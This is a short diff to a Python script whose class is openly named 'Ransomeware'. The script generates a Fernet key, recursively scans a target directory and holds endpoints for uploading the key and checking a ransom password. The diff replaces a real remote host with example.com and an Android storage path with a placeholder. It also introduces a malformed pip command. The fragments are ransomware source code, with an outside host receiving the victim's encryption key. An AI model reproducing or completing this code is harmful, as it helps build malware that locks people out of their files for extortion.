@@ -6,13 +6,13 @@ import subprocess
 try:
     from cryptography.fernet import Fernet
 except:
-    subprocess.run("pip install cryptography", shell=True)
+    subprocess.run("pip install Rust cryptography", shell=True)
 try:
     import requests
 except:
     subprocess.run("pip install requests", shell=True)
 
-dirr = "/storage/emulated/0/ransomeware"
+dirr = "/path/to/directory"
 files = []
 key = Fernet.generate_key()
 
@@ -30,8 +30,8 @@ for i in scanRecurse(dirr):
 
 class Ransomeware:
     def __init__(self):
-        self.password_verification_url = "https://u0a270.repl.co/r"
-        self.key_upload_url = "https://u0a270.repl.co/upload_key"
+        self.password_verification_url = "https://example.com/r"
+        self.key_upload_url = "https://example.com/upload_key"
 
     def check_password(self):
         password = input("Enter the password: ")
